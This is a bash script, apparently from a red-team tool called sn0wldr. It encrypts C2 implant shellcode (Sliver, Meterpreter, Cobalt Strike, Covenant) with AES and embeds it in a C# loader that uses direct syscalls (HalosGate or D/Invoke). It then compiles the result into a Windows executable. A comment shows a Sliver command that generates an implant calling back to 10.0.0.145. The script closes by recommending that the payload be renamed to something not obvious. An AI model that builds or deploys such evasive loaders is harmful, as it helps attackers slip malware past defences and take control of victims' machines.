#!/bin/bash

## Version 0.3, using HaloGates for direct syscalls
## Using AES for shellcode encryption and decryption

### To Generate a Sliver implant shellcode without obfuscation:
# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/sn0wldr/input/
# [*] Generating new windows/amd64 implant binary
# [!] Symbol obfuscation is disabled
# [*] Build completed in 00:01:25
# [*] Implant saved to /root/Codes/sn0wldr/input/sliver.bin
#
### Move the sliver.bin to folder input if required, then run the autogen script.

### Currently only 64bit has been tested
### Put the raw shellcode bin file into folder Input
### Fill in the following three required parameters

helpflag=0

while getopts t:a:s:h flag
do
    case "${flag}" in
        t) c2type=${OPTARG};;
        a) arch=${OPTARG};;
        s) syscalltype=${OPTARG};;
        h) helpflag=1;;
    esac
done

## Add new C2 type here:
type_array=("sliver|meterpreter|cobaltstrike|covenant");
arch_array=("x32|x64");
call_array=("dinvoke|halogate")

help_message="""[*] Usage: $0 -t <c2type> -a <target_os_arch> -s <syscall_type>
                \n[*] Exg..:  $0 -t sliver -a x64 -s halogate
                \n\n[!] Make sure the shellcode bin file located in input folder and named as <c2type>.bin
                \n[!] Currently c2type only support the following four:
                \n[!] \t$type_array
                \n[!] Current directly syscall methods only support the following two:
                \n[!] \t$call_array
                """

if [ $helpflag == 1 ]; then
    echo -e $help_message
    exit
fi


## Check if c2type parameter is valid, otherwise exit
if [ -z "${c2type}" ]; then
    echo -e "[!] Error: c2type can not be empty\n"
    echo -e $help_message
    exit
fi

if [[ "${type_array[@]}" =~ (^|[\|])"${c2type}"($|[\|]) ]]; then
    echo '[+] c2 type set to: '${c2type}
else
    echo "[!] Error: currently c2type only support the following four:"
    echo -e "$type_array\n"
    echo -e $help_message
    exit
fi

## Check if target arch is valid, otherwise exit
if [ -z "${arch}" ]; then
    echo -e "[!] Error: arch can not be empty\n"
    echo -e $help_message 
    exit
fi

if [[ "${arch_array[*]}" =~ (^|[\|])"${arch}"($|[\|]) ]]; then
    echo '[+] target OS arch: '${arch}
else
    echo '[!] Error: target OS arch only support the following two:'
    echo -e "$arch_array\n"
    echo -e $help_message
    exit
fi

## Check if direct syscall type parameter is valid, otherwise exit
if [ -z "${syscalltype}" ]; then
    echo -e "[!] Error: direct syscal type can not be empty\n"
    echo -e $help_message
    exit
fi

if [[ "${call_array[*]}" =~ (^|[\|])"${syscalltype}"($|[\|]) ]]; then
    echo '[+] direct syscall type set to: '${syscalltype}
else
    echo "[!] Error: currently direct syscall type only support the following two:"
    echo -e "$call_array\n"
    echo -e $help_message
    exit
fi

rawscfilename=$c2type'.bin'


## Check if target shellcode file exists
if [[ -f "input/$rawscfilename" ]]; then
    echo "[+] shellcode file: input/$rawscfilename"
else
    echo "[!] Error: input/$rawscfilename is missing"
    echo "[-] Copy shellcode bin file into folder input and naming it as <c2type>.bin. e.g. sliver.bin, meterpreter.bin etc"
    exit
fi



mkdir tmp
mkdir output

### Above are required parameters

rawscfilename_enc=$rawscfilename'.enc'
final_cs_filename='sn0wldr_'$syscalltype'_'$c2type'.cs'
final_exe_filename='sn0wldr_'$syscalltype'_'$c2type'_'$arch'.exe'

sleep 2

# copy the cs template file
cp loader_${syscalltype}_template.txt tmp/$final_cs_filename
# compile the AES encryptor
mono-csc -out:encryptor.exe -platform:x64 encryptor.cs
# encrypt the shellcode payload
mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output.txt


encpayload=$(cat tmp/enc_output.txt | grep 'Encrypted' | cut -d ' ' -f 2)
encpayloadlength=$(cat tmp/enc_output.txt | grep 'PayloadLength' | cut -d ':' -f 2)
aeskey=$(cat tmp/enc_output.txt | grep 'AES_Key' | cut -d ':' -f 2)
aesiv=$(cat tmp/enc_output.txt | grep 'AES_IV' | cut -d ':' -f 2)

if [ $arch = 'x64' ]
then
    sed -i 's|{{TARGETARCH}}|true|g' tmp/$final_cs_filename
fi

if [ $arch = 'x86' ]
then
    sed -i 's|{{TARGETARCH}}|false|g' tmp/$final_cs_filename
fi
sleep 1
sed -i 's|{{AESKEY}}|'$aeskey'|g' tmp/$final_cs_filename
sleep 1
sed -i 's|{{AESIV}}|'$aesiv'|g' tmp/$final_cs_filename
sleep 1
sed -i 's|{{PAYLOADLENGTH}}|'$encpayloadlength'|g' tmp/$final_cs_filename
sleep 1
#sed -i 's|{{ENCSHELLCODEPAYLOAD}}|'$encpayload'|g' tmp/$final_cs_filename
sed -i '' -f /dev/stdin tmp/$final_cs_filename << EOF
s/{{ENCSHELLCODEPAYLOAD}}/$encpayload/g
EOF
sleep 1

# compile the final exe output
mono-csc -out:output/$final_exe_filename -platform:$arch -unsafe tmp/$final_cs_filename

echo ""
echo "[+] Done. Check the output folder for the generated payload: $final_exe_filename"
echo "[+] It is highly recommended to rename the output payload to something not obviously."

